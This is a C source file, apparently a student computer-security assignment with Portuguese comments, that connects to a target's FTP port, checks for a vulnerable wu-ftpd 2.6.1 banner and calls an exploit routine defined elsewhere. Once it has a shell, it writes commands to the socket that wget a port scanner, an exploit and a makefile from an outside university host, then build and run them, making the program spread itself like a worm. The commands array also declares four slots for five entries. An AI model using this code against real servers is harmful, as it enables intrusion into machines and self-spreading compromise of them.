#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <sys/types.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <time.h>

void cshell (int sock);
int exploiter(int argc, char *argv[]);

int main(int argc, char *argv[]) {
 
    int meuSocket;
    int ret; 
    int conexao; 
    char buf[200]; 
    struct sockaddr_in vitima;
    meuSocket = socket(AF_INET, SOCK_STREAM, 0);
 
    if(meuSocket == -1) {
        printf("Ocorreu um erro no socket!\n");
        exit(1);    
    }
    
    vitima.sin_family = AF_INET;
    vitima.sin_port = htons(21);
    vitima.sin_addr.s_addr = inet_addr(argv[2]);
    conexao = connect(meuSocket, (struct sockaddr * )&vitima, sizeof(vitima));
    
    if(conexao == -1) {
        printf("Erro na conexao!\n");
        exit(1); 
    }
    memset(buf, '\0', 200);
    ret = recv(meuSocket, buf, 199, 0);
    printf("O banner é: %s\n", buf);
    printf("%p\n", strstr(buf,"220"));
    if (strstr(buf,"220 redhat1 FTP server (Version wu-2.6.1-18) ready.") != NULL) {
        printf("Esse é o banner\n");
        int fd = exploiter(argc, argv);
        cshell(fd);
        exit(1);
    }
     
    if(ret == -1) {
        printf("Nao recebeu nada!\n\n"); 
    }
     
    printf("O banner é: %s\n", buf);

    printf("Colocar aqui um if\n");
 
    close(meuSocket);
    return(0); 
}

void cshell (int sock) {
        int     l;
        char    buf[512];
        char    buf2[2];
        fd_set  rfds;

        char *commands[4] = {   
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n", 
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n", 
                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
                                "make\n",
                                "./portscan\n"
        }; //, "gcc portscan.c -o portscan", "./portscan"};
        // int buffsize[7] = {3, 4, 5, 3, 8};

        int i;
        for(i=0; i<4; i++) {
            write (sock, commands[i], strlen(commands[i]));
        }
        

        // int i = 0;
        // while (1) {
        //     // printf("%s\n", commands[i]);

        //     FD_SET (0, &rfds);
        //     FD_SET (sock, &rfds);

        //     select (sock + 1, &rfds, NULL, NULL, NULL);

        //     // This here is user input
        //     if (FD_ISSET (0, &rfds)) {
        //         // l = read (0, buf2, sizeof (buf2));
        //         sprintf(buf, "%s",commands[i]);
        //         l = strlen(buf);
        //         // buf[l] = '\0';
        //         printf("-- %d %s --\n", l, buf);
        //         if (l <= 0) {
        //             perror ("read user");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (sock, buf, l);

        //         i+=1;
        //     }

        //     // This is the terminal output
        //     if (FD_ISSET (sock, &rfds)) {
        //         l = read (sock, buf, sizeof (buf));
        //         //printf("-- %d %s --\n", l, buf);
        //         if (l == 0) {
        //             printf ("connection closed by foreign host.\n");
        //             exit (EXIT_FAILURE);
        //         } else if (l < 0) {
        //             perror ("read remote");
        //             exit (EXIT_FAILURE);
        //         }
        //         write (1, buf, l);
        //     }
        // }
}

// http://www.inf.ufpr.br/rdmgreca/sistdist/project1/relatorio/diag.c.txt